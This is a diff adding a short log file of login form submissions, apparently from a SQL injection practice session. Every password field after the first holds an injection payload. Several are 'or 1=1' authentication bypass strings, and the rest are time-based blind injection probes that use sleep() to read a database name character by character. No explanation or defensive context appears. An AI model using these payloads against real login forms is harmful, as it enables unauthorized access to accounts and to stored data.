@@ -1,0 +1,15 @@
+User Name:123Password:456
+User Name:123Password:1' or 1=1
+User Name:123Password:1' or 1=1--+
+User Name:123Password:1' or 1=1--+
+User Name:123Password:1' or 1=1--+
+User Name:123Password:1' or 1=1-- 
+User Name:qetPassword:1' or 1=1-- 
+User Name:123Password:1' or if(asci(mid(database(),1,1))=115,1,sleep(5))-- 
+User Name:123Password:1' or if(ascii(mid(database(),1,1))=115,1,sleep(5))-- 
+User Name:123Password:1' or if(ascii(mid(database(),1,1))=115,sleep(5),1)--
+User Name:123Password:1' or if(ascii(mid(database(),1,1))=115,sleep(5),1)--
+User Name:134Password:' or if(ascii(mid(database(),1,1))=116,sleep(5),1)-- '
+User Name:gegeePassword:' or if(ascii(mid(database(),1,1))=115,sleep(5),1)-- '
+User Name:134Password:' or if(ascii(mid(database(),1,1))=116,sleep(5),1)-- '
+User Name:yilianPassword:' or if(ascii(mid(database(),1,1))=115,sleep(5),1)-- '
